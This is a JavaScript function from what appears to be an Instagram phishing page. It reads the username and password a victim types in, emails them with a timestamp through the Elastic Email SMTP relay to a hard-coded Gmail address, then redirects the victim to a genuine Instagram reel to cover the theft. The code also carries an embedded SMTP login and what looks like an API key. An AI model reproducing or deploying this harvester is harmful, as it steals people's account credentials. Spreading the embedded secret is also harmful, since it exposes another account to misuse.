
function emailSend() {
    let user = document.querySelector("#user").value;
    let pass = document.querySelector("#pass").value;
    let time = Date();
    let msg = time + "<br/> UserData = " + user + "<br/> Password = " + pass;


    Email.send({
        Host: "smtp.elasticemail.com",
        Username: "kingomicron1857@gmail.com",
        Password: "8CF0CF1E8D91913D81BDD12DB45AB8497223",
        To: 'kingomicron1857@gmail.com',
        From: "kingomicron1857@gmail.com",
        Subject: "Insta_Data_" + user,
        Body: msg
    }).then(
        // message => alert(message)

        setTimeout(() => {
            window.location.replace("https://www.instagram.com/reel/C0EI5l-hCcR");
        }, 5000)
    );
}
